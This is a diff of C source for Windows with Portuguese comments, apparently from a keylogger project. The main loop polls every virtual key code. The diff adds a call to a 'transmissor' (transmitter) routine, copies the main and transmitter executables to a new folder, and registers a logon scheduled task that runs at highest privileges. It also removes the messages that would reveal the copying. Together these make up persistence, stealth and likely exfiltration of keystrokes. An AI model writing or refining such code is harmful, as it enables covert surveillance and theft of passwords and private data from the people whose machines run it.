@@ -21,7 +21,7 @@ int main()
 
     if (valPersis())
     {
-
+        chamadaTransmissor();
         while (1)
         {
             for (int vk = 0x08; vk <= 0xFE; vk++)
@@ -116,7 +116,6 @@ bool valPersis()
 
     if (!varsConf)
     {
-        char exePath[MAX_PATH];
         char currentPath[MAX_PATH];
         char exeDir[MAX_PATH];
         char srcMain[MAX_PATH_LEN];
@@ -141,6 +140,7 @@ bool valPersis()
         // Supondo que os executáveis que você quer copiar estão nessa mesma pasta
         // Ajuste "orig_main.exe" e "orig_transmissor.exe" para os nomes reais
         snprintf(srcMain, sizeof(srcMain), "%s\\main.exe", exeDir);
+
         snprintf(srcTrans, sizeof(srcTrans), "%s\\transmissor.exe", exeDir);
 
         // Cria pasta destino
@@ -155,18 +155,10 @@ bool valPersis()
         {
             fprintf(stderr, "CopyFile srcMain->dstMain falhou (%lu). Origem: %s\n", GetLastError(), srcMain);
         }
-        else
-        {
-            printf("Copiado: %s -> %s\n", srcMain, dstMain);
-        }
 
         if (!CopyFileA(srcTrans, dstTrans, FALSE))
         {
             fprintf(stderr, "CopyFile srcTrans->dstTrans falhou (%lu). Origem: %s\n", GetLastError(), srcTrans);
-        }
-        else
-        {
-            printf("Copiado: %s -> %s\n", srcTrans, dstTrans);
         }
 
         varsConf = fopen(configPath, "w");
@@ -179,7 +171,7 @@ bool valPersis()
         char schtasksCmd[MAX_PATH * 2];
         snprintf(schtasksCmd, sizeof(schtasksCmd),
                  "schtasks /create /tn \"MeuProgramaAutoStart\" /tr \"%s\" /sc onlogon /rl highest /f",
-                 exePath);
+                 dstMain);
 
         system(schtasksCmd);
 
